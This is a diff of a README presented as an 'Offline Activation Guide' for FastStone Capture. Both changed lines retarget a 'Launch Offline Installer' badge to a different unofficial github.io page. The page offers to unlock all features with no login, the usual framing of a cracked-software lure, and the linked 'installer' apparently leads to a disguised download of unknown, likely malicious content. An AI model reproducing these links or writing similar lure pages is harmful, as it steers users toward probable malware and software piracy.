@@ -1,6 +1,6 @@
 # FastStone Capture — Offline Activation Guide
 
-[![📸 Launch Offline Installer](https://img.shields.io/badge/📸%20Launch%20Offline%20Installer-Start%20Setup%20Assistant-%23665c9c?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/FAstst)
+[![📸 Launch Offline Installer](https://img.shields.io/badge/📸%20Launch%20Offline%20Installer-Start%20Setup%20Assistant-%23665c9c?style=for-the-badge)](https://faststone-capture-download.github.io/.github)
 
 > A lightweight offline setup assistant for FastStone Capture — install and enable all screen capture, recording, and editing tools with no login or internet.
 
@@ -37,7 +37,7 @@
 ![Annotation and Region Capture](https://blackjoomla.com/media/k2/items/cache/05a977f75c8bd421cf67e35678973f79_XL.jpg)  
 *Drawing and note tools directly in capture flow*
 
-[![📸 Launch Offline Installer](https://img.shields.io/badge/📸%20Launch%20Offline%20Installer-Start%20Setup%20Assistant-%23665c9c?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/FAstst)
+[![📸 Launch Offline Installer](https://img.shields.io/badge/📸%20Launch%20Offline%20Installer-Start%20Setup%20Assistant-%23665c9c?style=for-the-badge)](https://faststone-capture-download.github.io/.github)
 
 ---
 
